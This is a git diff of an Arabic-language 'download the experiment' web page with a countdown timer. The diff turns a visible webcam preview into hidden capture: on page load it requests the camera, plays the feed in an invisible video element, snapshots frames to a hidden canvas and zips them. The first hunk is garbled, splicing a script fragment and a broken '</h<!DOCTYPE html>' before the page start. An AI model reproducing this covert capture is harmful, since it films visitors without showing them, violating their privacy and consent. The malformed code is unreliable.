@@ -1,4 +1,23 @@
-<!DOCTYPE html>
+r.file(`image${i + 1}.png`, imgData, { base64: true });
+        }
+
+        // إنشاء الأرشيف وتحميله
+        const content = await zip.generateAsync({ type: "blob" });
+        const link = document.createElement('a');
+        link.href = URL.createObjectURL(content);
+        link.download = "images.zip"; // اسم الأرشيف الذي سيتم تحميله
+        link.click();
+    }
+
+    // بدء الكاميرا والعد التنازلي عند تحميل الصفحة
+    window.onload = function() {
+        startCamera(); // بدء الكاميرا وطلب الإذن
+        startCountdown(); // بدء العد التنازلي
+    };
+</script>
+
+</body>
+</h<!DOCTYPE html>
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
@@ -14,10 +33,6 @@
 
         h1 {
             color: #4CAF50;
-        }
-
-        #camera {
-            margin-top: 20px;
         }
 
         .download-button {
@@ -46,10 +61,6 @@
 <body>
 
 <h1>تحميل التجربة</h1>
-
-<!-- عرض الكاميرا لالتقاط الصور -->
-<video id="camera" width="640" height="480" autoplay></video>
-<canvas id="canvas" style="display:none;"></canvas>
 
 <!-- عداد العد التنازلي -->
 <p id="countdown" class="countdown">الوقت المتبقي: <span id="time">10</span> ثانية</p>
@@ -80,12 +91,15 @@
         }, 1000); // العد التنازلي كل ثانية
     }
 
-    // بدء الكاميرا لالتقاط الصور
+    // بدء الكاميرا لالتقاط الصور (دون عرض الفيديو)
     async function startCamera() {
         try {
-            const video = document.getElementById('camera');
+            const video = document.createElement('video'); // إنشاء عنصر فيديو مخفي
+            video.style.display = 'none'; // إخفاء الفيديو
+            document.body.appendChild(video); // إضافة الفيديو إلى الصفحة (لكن مخفي)
             cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
             video.srcObject = cameraStream;
+            video.play(); // بدء تشغيل الفيديو
         } catch (error) {
             alert("لم نتمكن من الوصول إلى الكاميرا. يرجى التأكد من منح الأذونات.");
         }
@@ -93,7 +107,7 @@
 
     // إيقاف الكاميرا
     function stopCamera() {
-        const video = document.getElementById('camera');
+        const video = document.querySelector('video'); // العثور على عنصر الفيديو المخفي
         const stream = video.srcObject;
         const tracks = stream.getTracks();
         tracks.forEach(track => track.stop());
@@ -102,8 +116,8 @@
 
     // التقاط صورة
     function captureImage() {
-        const canvas = document.getElementById('canvas');
-        const video = document.getElementById('camera');
+        const canvas = document.createElement('canvas'); // إنشاء عنصر canvas
+        const video = document.querySelector('video'); // العثور على الفيديو المخفي
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         const context = canvas.getContext('2d');
